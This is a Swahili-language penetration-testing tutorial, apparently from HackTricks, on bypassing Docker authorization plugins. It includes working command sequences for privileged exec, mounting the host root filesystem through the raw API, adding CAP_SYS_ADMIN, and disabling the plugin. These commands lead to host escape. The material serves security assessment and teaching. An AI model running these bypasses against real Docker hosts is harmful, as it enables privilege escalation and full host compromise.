# Plugins za Authorization za Runtime

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Plugins za authorization za runtime ni layer ya ziada ya policy inayoamua kama caller anaweza kutekeleza daemon action fulani. Docker ni mfano wa kawaida. Kwa default, mtu yeyote anayeweza kuwasiliana na Docker daemon huwa na control pana juu yake. Authorization plugins hujaribu kupunguza model hiyo kwa kuchunguza user aliyethibitishwa na API operation iliyoombwa, kisha kuruhusu au kukataa request kulingana na policy.

Mada hii inahitaji ukurasa wake kwa sababu hubadilisha exploitation model wakati attacker tayari ana access ya Docker API au ya user aliye kwenye `docker` group. Katika mazingira hayo, swali si tena tu "naweza kufikia daemon?" bali pia "daemon imewekewa authorization layer, na ikiwa imewekewa, je, layer hiyo inaweza bypass kupitia endpoints ambazo hazijashughulikiwa, JSON parsing dhaifu, au permissions za plugin-management?"

## Uendeshaji

Request inapofika kwenye Docker daemon, authorization subsystem inaweza kupitisha request context kwa plugin moja au zaidi zilizosakinishwa. Plugin huona identity ya user aliyethibitishwa, request details, headers zilizochaguliwa, na sehemu za request au response body wakati content type inafaa. Plugins nyingi zinaweza kuunganishwa, na access hutolewa tu ikiwa plugins zote zimeruhusu request.

Model hii inaonekana kuwa imara, lakini usalama wake unategemea kabisa jinsi policy author alivyoelewa API kwa ukamilifu. Plugin inayozuia `docker run --privileged` lakini inapuuza `docker exec`, inakosa alternate JSON keys kama `Binds` ya kiwango cha juu, au inaruhusu plugin administration inaweza kuunda hisia ya ulinzi wa uongo huku bado ikiacha direct privilege-escalation paths wazi.

## Common Plugin Targets

Maeneo muhimu ya kukagua policy ni:

- container creation endpoints
- fields za `HostConfig` kama vile `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, na namespace-sharing options
- tabia ya `docker exec`
- plugin management endpoints
- endpoint yoyote inayoweza kuanzisha runtime actions kwa njia isiyo ya moja kwa moja nje ya intended policy model

Kihistoria, mifano kama Twistlock's `authz` plugin na educational plugins rahisi kama `authobot` ilifanya model hii iwe rahisi kuchunguza kwa sababu policy files na code paths zake zilionyesha jinsi endpoint-to-action mapping ilivyotekelezwa. Kwa assessment work, somo muhimu ni kwamba policy author lazima aelewe API surface yote badala ya commands za CLI zinazoonekana zaidi.

## Matumizi Mabaya

Lengo la kwanza ni kujifunza ni nini hasa kimezuiwa. Daemon inapokataa action, error mara nyingi hu-leak jina la plugin, jambo linalosaidia kutambua control inayotumika:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Ikiwa unahitaji endpoint profiling pana zaidi, tools kama `docker_auth_profiler` ni muhimu kwa sababu zinafanya kiotomatiki kazi inayojirudia ya kuangalia ni API routes na JSON structures zipi zinaruhusiwa na plugin.

Ikiwa mazingira yanatumia plugin maalum na unaweza kuingiliana na API, orodhesha ni object fields zipi zimechujwa:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Ukaguzi huu ni muhimu kwa sababu makosa mengi ya authorization yanahusu field fulani badala ya concept fulani. Plugin inaweza kukataa pattern ya CLI bila kuzuia kikamilifu muundo sawa wa API.

### Mfano Kamili: `docker exec` Huongeza Privilege Baada ya Kuundwa kwa Container

Policy inayozuia uundaji wa container yenye privileged lakini inaruhusu uundaji wa container isiyo na vizuizi pamoja na `docker exec` bado inaweza kupitwa:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
If daemon itakubali hatua ya pili, user amerejesha privileged interactive process ndani ya container ambayo policy author aliamini ilikuwa imewekewa vikwazo.

### Mfano Kamili: Bind Mount Kupitia Raw API

Baadhi ya policies zilizovunjika hukagua JSON shape moja pekee. Ikiwa root filesystem bind mount haijazuiwa kwa uthabiti, host bado inaweza ku-mountiwa:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Wazo hilo hilo linaweza pia kuonekana chini ya `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Athari ni kutoroka kabisa kwenye filesystem ya host. Jambo la kuvutia ni kwamba bypass inatokana na coverage isiyokamilika ya policy badala ya bug ya kernel.

### Mfano Kamili: Attribute ya Capability Isiyokaguliwa

Ikiwa policy itasahau kuchuja attribute inayohusiana na capability, attacker anaweza kuunda container inayopata tena capability hatari:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Mara `CAP_SYS_ADMIN` au capability yenye nguvu kama hiyo inapopatikana, mbinu nyingi za breakout zilizoelezwa katika [capabilities.md](protections/capabilities.md) na [privileged-containers.md](privileged-containers.md) huwa zinaweza kufikiwa.

### Mfano Kamili: Kuzima Plugin

Iwapo operesheni za usimamizi wa plugin zinaruhusiwa, bypass iliyo safi zaidi inaweza kuwa kuzima kabisa udhibiti huo:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Hii ni failure ya policy katika kiwango cha control-plane. Safu ya authorization ipo, lakini mtumiaji ambaye ilipaswa kumwekea vikwazo bado ana ruhusa ya kuizima.

## Checks

Amri hizi zinalenga kubaini ikiwa kuna safu ya policy na ikiwa inaonekana kuwa kamili au ya juu juu.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Kinachovutia hapa:

- Ujumbe wa kukataliwa unaojumuisha jina la plugin unathibitisha kuwepo kwa authorization layer na mara nyingi hufichua implementation halisi.
- Orodha ya plugin inayoonekana kwa attacker inaweza kutosha kugundua ikiwa operesheni za disable au reconfigure zinawezekana.
- Policy inayozuia tu CLI actions zilizo wazi lakini hairuhusu raw API requests inapaswa kuchukuliwa kuwa inaweza kubypassiwa hadi ithibitishwe vinginevyo.

## Runtime Defaults

| Runtime / platform | Hali ya kawaida | Tabia ya kawaida | Kudhoofisha kwa mikono kunakotokea mara nyingi |
| --- | --- | --- | --- |
| Docker Engine | Haijawezeshwa kwa default | Ufikiaji wa daemon kwa vitendo ni wa all-or-nothing isipokuwa authorization plugin imesanidiwa | plugin policy isiyokamilika, blacklists badala ya allowlists, kuruhusu usimamizi wa plugin, mapungufu ya field-level |
| Podman | Sio equivalent ya kawaida ya moja kwa moja | Podman kwa kawaida hutegemea zaidi Unix permissions, rootless execution, na maamuzi kuhusu API exposure kuliko Docker-style authz plugins | kuweka wazi rootful Podman API kwa upana, socket permissions dhaifu |
| containerd / CRI-O | Ina control model tofauti | Runtime hizi kwa kawaida hutegemea socket permissions, node trust boundaries, na controls za orchestrator za layer ya juu badala ya Docker authz plugins | ku-mount socket ndani ya workloads, node-local trust assumptions dhaifu |
| Kubernetes | Hutumia authn/authz katika layers za API-server na kubelet, si Docker authz plugins | Cluster RBAC na admission controls ndizo policy layer kuu | RBAC pana kupita kiasi, admission policy dhaifu, kuweka kubelet au runtime APIs wazi moja kwa moja |
{{#include ../../../banners/hacktricks-training.md}}
